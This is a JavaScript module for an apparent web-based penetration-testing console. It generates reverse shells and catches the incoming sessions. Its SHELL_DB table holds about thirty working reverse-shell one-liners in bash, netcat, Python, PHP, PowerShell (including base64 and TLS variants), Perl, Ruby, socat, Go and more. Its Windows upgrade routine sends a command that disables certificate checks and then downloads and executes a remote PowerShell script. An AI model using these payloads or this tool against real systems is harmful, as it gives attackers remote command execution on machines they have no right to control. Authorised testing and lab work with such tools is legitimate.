// ══ CATCHER / REV SHELL GENERATOR ══
import { esc, fmtBytes } from './state.js';
import { toast } from './modals.js';

const SHELL_DB = {
  // Bash
  "Bash -i":                    "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1",
  "Bash 196":                   "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196",
  "Bash read line":             "exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
  "Bash udp":                   "sh -i >& /dev/udp/{IP}/{PORT} 0>&1",
  // Netcat
  "nc -e":                      "nc -e /bin/sh {IP} {PORT}",
  "nc.exe -e":                  "nc.exe -e cmd.exe {IP} {PORT}",
  "BusyBox nc -e":              "busybox nc {IP} {PORT} -e sh",
  "nc -c":                      "nc -c sh {IP} {PORT}",
  "nc mkfifo":                  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f",
  "ncat -e":                    "ncat {IP} {PORT} -e /bin/sh",
  "ncat udp":                   "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|ncat -u {IP} {PORT} >/tmp/f",
  // Python
  "Python3 #1":                 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
  "Python3 #2":                 'python3 -c \'import socket,subprocess,os,pty;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\'',
  // PHP
  "PHP exec":                   'php -r \'$s=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
  "PHP shell_exec":             'php -r \'$s=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
  "PHP passthru":               'php -r \'$s=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'',
  // PowerShell
  "PowerShell #1":              "$LHOST = \"{IP}\"; $LPORT = {PORT}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
  "PowerShell #2":              "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
  "PowerShell #3 (Base64)":     "PS_B64:$client = New-Object System.Net.Sockets.TCPClient('{IP}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
  "PowerShell #4 (TLS)":        "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{IP}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
  "PowerShell #5 (Base64, stderr)": "PS_B64:$ErrorView=\"NormalView\";$ErrorActionPreference=\"Continue\";$c=New-Object System.Net.Sockets.TCPClient('{IP}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){$d=([text.encoding]::ASCII).GetString($b,0,$i);try{$o=iex $d 2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}catch{$o=$_|Out-String}if([string]::IsNullOrEmpty($o)){$o=\"\"}$p=\"PS \"+(pwd).Path+\"> \";[byte[]]$sb=([text.encoding]::ASCII).GetBytes($o+$p);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()",
  // Other
  "Perl":                       'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
  "Ruby":                       'ruby -rsocket -e\'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
  "Socat #1":                   "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:{PORT}",
  "Java #1":                    'Runtime rt = Runtime.getRuntime();String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"};rt.exec(cmd);',
  "Lua":                        'lua -e \'require("socket");require("os");t=socket.tcp();t:connect("{IP}","{PORT}");os.execute("/bin/sh -i <&3 >&3 2>&3");\'',
  "Awk":                        'awk \'BEGIN{s="/inet/tcp/0/{IP}/{PORT}";while(1){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print$0|&s;close(c)}}while(c!="exit")}}\'',
  "node.js":                    "require('child_process').exec('/bin/sh -i <&3 >&3 2>&3')",
  "Golang":                     'package main\x0aimport(\x0a"os/exec"\x0a"net"\x0a)\x0afunc main(){\x0ac:=exec.Command("/bin/sh")\x0an,_:=net.Dial("tcp","{IP}:{PORT}")\x0ac.Stdin=n;c.Stdout=n;c.Stderr=n;c.Run()\x0a}',
};

const CT = {
  listeners: {},
  sessions: {},
  tabCounter: 0,
};

// ── Generator ──
function initGenerator() {
  const sel = document.getElementById("gen-shell");
  if (!sel) return;
  Object.keys(SHELL_DB).forEach((name) => {
    const opt = document.createElement("option");
    opt.value = name;
    opt.textContent = name;
    sel.appendChild(opt);
  });
  // Pre-fill IP from browser location
  const ipInput = document.getElementById("gen-ip");
  if (ipInput && !ipInput.value) {
    ipInput.value = location.hostname || "127.0.0.1";
  }
  updateGeneratorOutput();
}

export function updateGeneratorOutput() {
  const ip = document.getElementById("gen-ip")?.value || "10.10.10.10";
  const port = document.getElementById("gen-port")?.value || "4444";
  const shell = document.getElementById("gen-shell")?.value;
  const encoding = document.getElementById("gen-encoding")?.value;
  const out = document.getElementById("gen-output");
  const listenerOut = document.getElementById("gen-listener-output");

  if (!shell || !out) return;

  let cmd = SHELL_DB[shell] || "";

  // PowerShell base64 templates: always output as UTF-16LE base64 wrapped in powershell -e
  const isPSB64 = cmd.startsWith("PS_B64:");
  if (isPSB64) cmd = cmd.slice(7);

  // Replace both {IP}/{PORT} (uppercase) and {ip}/{port} (lowercase) placeholders
  cmd = cmd.replace(/\{IP\}/g, ip).replace(/\{ip\}/g, ip)
          .replace(/\{PORT\}/g, port).replace(/\{port\}/g, port);

  if (isPSB64) {
    // Encode as UTF-16LE then base64 — what PowerShell -EncodedCommand expects
    const codeUnits = new Uint16Array(cmd.length);
    for (let i = 0; i < codeUnits.length; i++) {
      codeUnits[i] = cmd.charCodeAt(i);
    }
    const charCodes = new Uint8Array(codeUnits.buffer);
    let bin = "";
    for (let i = 0; i < charCodes.byteLength; i++) {
      bin += String.fromCharCode(charCodes[i]);
    }
    cmd = "powershell -e " + btoa(bin);
  } else if (encoding === "url") {
    cmd = encodeURIComponent(cmd);
  } else if (encoding === "base64") {
    cmd = btoa(cmd);
  }

  out.textContent = cmd;
  if (listenerOut) {
    listenerOut.textContent = `nc -lvnp ${port}`;
  }
}

export function copyGeneratorOutput() {
  const text = document.getElementById("gen-output")?.textContent || "";
  navigator.clipboard
    .writeText(text)
    .then(() => toast("Copied to clipboard", "ok"));
}

export function copyListenerCommand() {
  const text =
    document.getElementById("gen-listener-output")?.textContent || "";
  navigator.clipboard
    .writeText(text)
    .then(() => toast("Copied to clipboard", "ok"));
}

// ── Catcher Listeners ──
export function spawnListenerTab() {
  CT.tabCounter++;
  const tabId = `listener-${CT.tabCounter}`;

  // Create tab before the "+" button
  const tabsEl = document.getElementById("catcher-tabs");
  const addBtn = tabsEl.querySelector(".ctab-add");
  const tab = document.createElement("div");
  tab.className = "ctab";
  tab.id = `ctab-${tabId}`;
  const label = document.createElement("span");
  label.className = "ctab-label";
  label.textContent = "Listener";
  label.ondblclick = function (e) {
    e.stopPropagation();
    renameListenerTab(tabId, this);
  };
  const close = document.createElement("span");
  close.className = "ctab-close";
  close.innerHTML = "&times;";
  close.title = "Close";
  close.onclick = function (e) {
    e.stopPropagation();
    destroyListenerTab(tabId);
  };
  tab.appendChild(label);
  tab.appendChild(close);
  tab.onclick = function () {
    switchCatcherTab(tabId, this);
  };
  tabsEl.insertBefore(tab, addBtn);

  // Create setup panel with port form + start button
  const panel = document.createElement("div");
  panel.className = "cpanel";
  panel.id = `cpanel-${tabId}`;
  panel.innerHTML = `
    <div class="catcher-listener-panel">
      <div class="catcher-setup" id="setup-${tabId}">
        <div class="catcher-setup-row">
          <label>Port</label>
          <input type="number" id="setup-port-${tabId}" value="4444" min="1" max="65535" />
        </div>
        <button class="catcher-start-btn" id="setup-btn-${tabId}" onclick="startCatcherListener('${tabId}')">Start Listener</button>
      </div>
      <div class="catcher-sessions" id="sessions-${tabId}"></div>
    </div>`;
  document.querySelector(".catcher-layout").appendChild(panel);

  switchCatcherTab(tabId, tab);
}

function renameListenerTab(tabId, labelEl) {
  const current = labelEl.textContent;
  const input = document.createElement("input");
  input.type = "text";
  input.className = "ctab-rename-input";
  input.value = current;
  labelEl.textContent = "";
  labelEl.appendChild(input);
  input.focus();
  input.select();

  const finish = () => {
    const val = input.value.trim() || current;
    labelEl.textContent = val;
  };
  input.onblur = finish;
  input.onkeydown = (e) => {
    if (e.key === "Enter") input.blur();
    if (e.key === "Escape") {
      input.value = current;
      input.blur();
    }
  };
}

export function startCatcherListener(tabId) {
  const portInput = document.getElementById(`setup-port-${tabId}`);
  const port = parseInt(portInput?.value, 10);
  if (!port || port < 1 || port > 65535) {
    toast("Invalid port (1-65535)", "error");
    return;
  }

  const btn = document.getElementById(`setup-btn-${tabId}`);
  if (btn) {
    btn.disabled = true;
    btn.textContent = "Starting...";
  }

  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || "";
  fetch("/?catcher-api=start", {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
    body: JSON.stringify({ ip: "0.0.0.0", port }),
  })
    .then((r) => {
      if (!r.ok)
        return r.json().then((e) => {
          throw new Error(e.error || "Failed");
        });
      return r.json();
    })
    .then((info) => {
      CT.listeners[tabId] = { id: info.id, ip: info.ip, port, sessions: [] };

      // Update tab label to show port if user hasn't renamed it
      const tab = document.getElementById(`ctab-${tabId}`);
      const lbl = tab?.querySelector(".ctab-label");
      if (lbl && lbl.textContent === "Listener") lbl.textContent = port;

      // Replace setup form with listening status
      const setupEl = document.getElementById(`setup-${tabId}`);
      if (setupEl) {
        setupEl.className = "catcher-listener-header";
        setupEl.removeAttribute("id");
        setupEl.innerHTML = `
            <span>Listening on <strong>0.0.0.0:${port}</strong></span>
            <div class="catcher-header-actions">
              <button class="catcher-restart-btn" onclick="restartCatcherListener('${tabId}')">Restart</button>
              <button class="catcher-stop-btn" onclick="stopCatcherListener('${tabId}')">Stop</button>
            </div>`;
      }

      // Add empty sessions placeholder
      const sessContainer = document.getElementById(`sessions-${tabId}`);
      if (sessContainer && !sessContainer.querySelector(".catcher-empty")) {
        sessContainer.innerHTML =
          '<div class="catcher-empty">Waiting for connections...</div>';
      }

      toast(`Listener started on port ${port}`, "ok");
    })
    .catch((e) => {
      if (btn) {
        btn.disabled = false;
        btn.textContent = "Start Listener";
      }
      toast(e.message, "error");
    });
}

export function stopCatcherListener(tabId) {
  const ln = CT.listeners[tabId];
  if (!ln) return;

  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || "";
  fetch("/?catcher-api=stop", {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
    body: JSON.stringify({ id: ln.id }),
  })
    .then(() => {
      delete CT.listeners[tabId];

      // Disconnect sessions but leave their history cards in the DOM
      Object.keys(CT.sessions).forEach((sid) => {
        if (CT.sessions[sid].tabId === tabId) {
          if (CT.sessions[sid].ws) {
            CT.sessions[sid].ws.close();
            CT.sessions[sid].ws = null;
          }
          if (CT.sessions[sid].term) {
            CT.sessions[sid].term.write(
              "\r\n\x1b[31m[Listener stopped]\x1b[0m",
            );
          }
        }
      });

      // Swap header to stopped state
      const headerEl = document
        .getElementById(`cpanel-${tabId}`)
        ?.querySelector(".catcher-listener-header");
      if (headerEl) {
        headerEl.innerHTML = `
          <span class="catcher-stopped-text">Stopped on port <strong>${ln.port}</strong></span>
          <div class="catcher-header-actions">
            <button class="catcher-start-btn" onclick="showRestartForm('${tabId}', ${ln.port})">Restart</button>
          </div>`;
      }

      toast(`Listener on port ${ln.port} stopped`, "ok");
    })
    .catch(() => {});
}

export function showRestartForm(tabId, lastPort) {
  const headerEl = document
    .getElementById(`cpanel-${tabId}`)
    ?.querySelector(".catcher-listener-header");
  if (!headerEl) return;
  headerEl.innerHTML = `
      <div class="catcher-setup-row">
        <label>Port</label>
        <input type="number" id="setup-port-${tabId}" value="${lastPort}" min="1" max="65535" />
      </div>
      <button class="catcher-start-btn" id="setup-btn-${tabId}" onclick="startCatcherListener('${tabId}')">Start Listener</button>`;
}

export function restartCatcherListener(tabId) {
  const ln = CT.listeners[tabId];
  if (ln) {
    showRestartForm(tabId, ln.port);
  }
}

function destroyListenerTab(tabId) {
  const ln = CT.listeners[tabId];

  // Stop the backend listener if running
  if (ln) {
    const csrf =
      document.querySelector('meta[name="csrf-token"]')?.content || "";
    fetch("/?catcher-api=stop", {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
      body: JSON.stringify({ id: ln.id }),
    }).catch(() => {});
  }

  // Close all session WS
  Object.keys(CT.sessions).forEach((sid) => {
    if (CT.sessions[sid].tabId === tabId) {
      disconnectCatcherSession(sid);
    }
  });

  // Remove tab + panel from DOM
  document.getElementById(`ctab-${tabId}`)?.remove();
  document.getElementById(`cpanel-${tabId}`)?.remove();
  delete CT.listeners[tabId];

  // Switch to generator tab
  const genTab = document.querySelector("#catcher-tabs .ctab:not(.ctab-add)");
  if (genTab) genTab.click();
}

export function switchCatcherTab(name, el) {
  document
    .querySelectorAll("#catcher-tabs .ctab")
    .forEach((t) => t.classList.remove("active"));
  document
    .querySelectorAll(".catcher-layout .cpanel")
    .forEach((p) => p.classList.remove("active"));
  if (el) el.classList.add("active");
  const panel = document.getElementById(`cpanel-${name}`);
  if (panel) panel.classList.add("active");

  // Clear badge if viewing catcher tab
  const badge = document.getElementById("catcher-badge");
  if (badge) badge.classList.remove("dot");
}

// ── Catcher Sessions ──
export function onCatcherConnection(msg) {
  // Find which listener tab this belongs to
  let tabId = null;
  for (const [tid, ln] of Object.entries(CT.listeners)) {
    if (ln.id === msg.listenerID) {
      tabId = tid;
      break;
    }
  }
  if (!tabId) return;

  // Add session to state
  CT.sessions[msg.sessionID] = {
    id: msg.sessionID,
    listenerID: msg.listenerID,
    tabId,
    ws: null,
    term: null,
    lineMode: true,
    lineBuffer: "",
    osDetected: false,
    isWindows: false,
    detectBuf: "",
  };

  // Update UI
  const container = document.getElementById(`sessions-${tabId}`);
  if (container) {
    const empty = container.querySelector(".catcher-empty");
    if (empty) empty.remove();

    const sessionEl = document.createElement("div");
    sessionEl.className = "catcher-session";
    sessionEl.id = `session-${msg.sessionID}`;
    sessionEl.innerHTML = `
      <div class="catcher-session-header">
        <span class="catcher-session-addr">${esc(msg.remoteAddr)}</span>
        <button class="catcher-session-linemode active" onclick="toggleLineMode('${msg.sessionID}')" title="Toggle line mode (for unupgraded shells)">Line</button>
        <div class="catcher-upgrade-wrap">
          <button class="catcher-session-upgrade" onclick="this.parentElement.classList.toggle('open')" title="Upgrade shell">↑</button>
          <div class="catcher-upgrade-menu">
            <button onclick="upgradeCatcherUnix('${msg.sessionID}');this.closest('.catcher-upgrade-wrap').classList.remove('open')">Unix (PTY)</button>
            <button onclick="upgradeCatcherWindows('${msg.sessionID}');this.closest('.catcher-upgrade-wrap').classList.remove('open')">Windows (ConPtyShell)</button>
          </div>
        </div>
        <button class="catcher-session-resize" onclick="resizeCatcherTerm('${msg.sessionID}')" title="Resize terminal to fit"><svg width="14" height="14" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M1 5V1h4M11 1h4v4M15 11v4h-4M5 15H1v-4"/><path d="M1 1l5.5 5.5M15 15l-5.5-5.5"/></svg></button>
        <button class="catcher-session-connect" onclick="connectCatcherSession('${msg.sessionID}')">Connect</button>
        <button class="catcher-session-kill" onclick="killCatcherSession('${msg.sessionID}')">Kill</button>
      </div>
      <div class="catcher-terminal" id="term-${msg.sessionID}"></div>`;
    container.appendChild(sessionEl);
  }

  // Show badge
  const badge = document.getElementById("catcher-badge");
  if (badge) badge.classList.add("dot");

  toast(`Reverse shell from ${msg.remoteAddr}`, "ok");
}

export function connectCatcherSession(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s) return;

  // Already connected?
  if (s.ws && s.ws.readyState === WebSocket.OPEN) return;

  const proto = location.protocol === "https:" ? "wss" : "ws";
  const ws = new WebSocket(
    `${proto}://${location.host}/?catcher-ws&session=${sessionID}`,
  );
  ws.binaryType = "arraybuffer";

  const container = document.getElementById(`term-${sessionID}`);
  if (!container) return;

  // Hide connect button
  const btn = container.parentElement.querySelector(".catcher-session-connect");
  if (btn) btn.style.display = "none";

  // Create xterm
  const term = new Terminal({
    theme: {
      background: "#2e3440",
      foreground: "#d8dee9",
      cursor: "#88c0d0",
      selectionBackground: "#434c5e",
    },
    fontFamily: "'Fira Code VF', monospace",
    fontSize: 14,
    cursorBlink: true,
    scrollback: 5000,
  });
  term.open(container);

  // FitAddon — sizes terminal to container
  const FitAddonCtor = window.FitAddon?.FitAddon || window.FitAddon;
  const fitAddon = new FitAddonCtor();
  term.loadAddon(fitAddon);

  // Safe resize: always start with a valid size, then let FitAddon refine
  const fitTerm = () => {
    requestAnimationFrame(() => {
      try {
        fitAddon.fit();
      } catch (e) {}
    });
  };
  term.resize(80, 24);
  // Let the renderer paint, then fit to container
  setTimeout(fitTerm, 150);

  // Watch the session card (parent) — it's what actually changes when the flex layout recomputes
  const sessionCard = container.parentElement;
  const ro = new ResizeObserver(fitTerm);
  if (sessionCard) ro.observe(sessionCard);
  ro.observe(container);
  window.addEventListener("resize", fitTerm);

  // Attach WS to terminal manually (not using addon since WS is not standard)
  ws.onmessage = (e) => {
    if (e.data instanceof ArrayBuffer) {
      const bytes = new Uint8Array(e.data);
      term.write(bytes);

      // Auto-detect OS from initial shell output
      if (!s.osDetected) {
        try { s.detectBuf += new TextDecoder().decode(bytes); } catch(_) {}
        if (s.detectBuf.length > 4096) s.detectBuf = s.detectBuf.slice(-4096);

        if (/[A-Z]:\\|PS [A-Z]:\\|Microsoft Windows/i.test(s.detectBuf)) {
          // Windows detected — keep line mode on
          s.isWindows = true;
          s.osDetected = true;
        } else if (/[$#]\s*$|\r\n\$|\r\n#|\/home\/|\/usr\/|\/bin\/(ba)?sh/i.test(s.detectBuf)) {
          // Linux detected — disable line mode, grey out button
          s.isWindows = false;
          s.osDetected = true;
          s.lineMode = false;
          s.lineBuffer = "";
          const lbtn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
          if (lbtn) { lbtn.classList.remove("active"); lbtn.disabled = true; }
        }
      }
    }
  };

  term.onData((data) => {
    if (ws.readyState !== WebSocket.OPEN) return;
    const enc = new TextEncoder();

    if (!s.lineMode) {
      // Raw mode: send immediately
      ws.send(enc.encode(data));
      return;
    }

    // Line mode: buffer input with local echo, send complete line on Enter
    for (const ch of data) {
      if (ch === "\r") {
        // Enter: send buffered line
        term.write("\r\n");
        ws.send(enc.encode(s.lineBuffer + "\r\n"));
        s.lineBuffer = "";
      } else if (ch === "\x7f" || ch === "\b") {
        // Backspace
        if (s.lineBuffer.length > 0) {
          s.lineBuffer = s.lineBuffer.slice(0, -1);
          term.write("\b \b");
        }
      } else if (ch === "\x03") {
        // Ctrl+C: send raw, clear buffer
        term.write("^C\r\n");
        ws.send(enc.encode("\x03"));
        s.lineBuffer = "";
      } else if (ch === "\x15") {
        // Ctrl+U: clear line
        const len = s.lineBuffer.length;
        if (len > 0) {
          term.write("\r\x1b[K");
          s.lineBuffer = "";
        }
      } else if (ch.charCodeAt(0) >= 0x20) {
        // Printable character
        s.lineBuffer += ch;
        term.write(ch);
      }
      // Other control chars / escape sequences ignored in line mode
    }
  });

  ws.onopen = () => {
    setTimeout(fitTerm, 50);
  };

  ws.onclose = () => {
    term.write("\r\n\x1b[31m[Disconnected]\x1b[0m");
    ro.disconnect();
    window.removeEventListener("resize", fitTerm);
  };

  s.ws = ws;
  s.term = term;
  s.fitAddon = fitAddon;

  // Auto-connect on button click also switches to this listener tab
  const panel = document.getElementById(`cpanel-${s.tabId}`);
  if (panel && !panel.classList.contains("active")) {
    const tab = document.getElementById(`ctab-${s.tabId}`);
    if (tab) tab.click();
  }
}

export function toggleLineMode(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s) return;
  s.lineMode = !s.lineMode;
  s.lineBuffer = "";
  const btn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
  if (btn) btn.classList.toggle("active", s.lineMode);
}

export function resizeCatcherTerm(sessionID) {
  const s = CT.sessions[sessionID];
  if (s?.fitAddon) {
    requestAnimationFrame(() => {
      try {
        s.fitAddon.fit();
      } catch (e) {}
    });
  }
}

export function upgradeCatcherUnix(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s?.ws || s.ws.readyState !== WebSocket.OPEN) {
    toast("Connect to the session first", "err");
    return;
  }
  const enc = new TextEncoder();
  const rows = s.term?.rows || 24;
  const cols = s.term?.cols || 80;
  // Set terminal type
  s.ws.send(enc.encode("export TERM=xterm-256color\n"));
  // Attempt PTY upgrade — tries multiple methods, errors suppressed
  setTimeout(() => {
    if (s.ws?.readyState !== WebSocket.OPEN) return;
    s.ws.send(
      enc.encode(
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
          "python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || " +
          "script /dev/null -qc /bin/bash 2>/dev/null || true\n",
      ),
    );
  }, 200);
  // Set terminal dimensions after upgrade has time to complete
  setTimeout(() => {
    if (s.ws?.readyState !== WebSocket.OPEN) return;
    s.ws.send(enc.encode(`stty rows ${rows} cols ${cols}\n`));
  }, 1500);
  // PTY provides proper terminal handling — switch to raw mode
  s.lineMode = false;
  s.lineBuffer = "";
  const btn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
  if (btn) btn.classList.remove("active");
}

export function upgradeCatcherWindows(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s?.ws || s.ws.readyState !== WebSocket.OPEN) {
    toast("Connect to the session first", "err");
    return;
  }
  const rows = s.term?.rows || 24;
  const cols = s.term?.cols || 80;
  const enc = new TextEncoder();
  const proto = location.protocol === "https:" ? "https" : "http";
  const host = location.host;
  const url = `${proto}://${host}/ConPtyShell.ps1?embedded`;
  // Skip cert validation for self-signed certs, then download and run ConPtyShell
  // -Upgrade hijacks the existing socket so no second connection needed
  const cmd =
    `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;` +
    `Add-Type -TypeDefinition 'using System.Net;using System.Security.Cryptography.X509Certificates;public class Trust{public static void Enable(){System.Net.ServicePointManager.ServerCertificateValidationCallback=delegate{return true;};}}';[Trust]::Enable();` +
    `IEX((New-Object Net.WebClient).DownloadString('${url}'));Invoke-ConPtyShell -Upgrade -Rows ${rows} -Cols ${cols}\n`;
  s.ws.send(enc.encode(cmd));
  // ConPtyShell provides a proper PTY — switch to raw mode
  s.lineMode = false;
  s.lineBuffer = "";
  const btn = document.querySelector(`#session-${sessionID} .catcher-session-linemode`);
  if (btn) btn.classList.remove("active");
  toast("Sent ConPtyShell upgrade command", "ok");
}

function disconnectCatcherSession(sessionID) {
  const s = CT.sessions[sessionID];
  if (!s) return;
  if (s.ws) {
    s.ws.close();
    s.ws = null;
  }
  if (s.term) {
    s.term.dispose();
    s.term = null;
  }
  delete CT.sessions[sessionID];
}

export function killCatcherSession(sessionID) {
  const csrf = document.querySelector('meta[name="csrf-token"]')?.content || "";
  fetch("/?catcher-api=kill-session", {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-CSRF-Token": csrf },
    body: JSON.stringify({ id: sessionID }),
  })
    .then(() => {
      disconnectCatcherSession(sessionID);
      document.getElementById(`session-${sessionID}`)?.remove();
    })
    .catch(() => {});
}

// ── Init ──
export function initCatcher() {
  initGenerator();
}
